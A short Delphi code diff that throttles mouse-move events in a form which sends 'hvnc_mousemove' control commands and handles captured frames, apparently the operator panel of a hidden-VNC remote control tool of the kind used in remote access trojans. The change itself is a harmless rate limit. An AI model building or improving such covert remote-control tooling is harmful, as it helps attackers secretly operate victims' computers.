@@ -58,6 +58,7 @@ type
     FBitmapLock  : TCriticalSection;
     FLastWidth   : Integer;
     FLastHeight  : Integer;
+    FLastMouseMoveTime : Cardinal;
 
     FFocusedHwnd : UInt64;
 
@@ -109,6 +110,7 @@ begin
   FIsCapturing    := False;
   FLastWidth      := 0;
   FLastHeight     := 0;
+  FLastMouseMoveTime := 0;
   FHasFrame       := False;
   FFocusedHwnd    := 0;
   FPaintBoxActive := False;
@@ -616,6 +618,8 @@ end;
 procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
   X, Y: Integer);
 begin
+  if GetTickCount - FLastMouseMoveTime < 30 then Exit;
+  FLastMouseMoveTime := GetTickCount;
   SendControlCommand('hvnc_mousemove', X, Y, -1, -1, False);
 end;
 
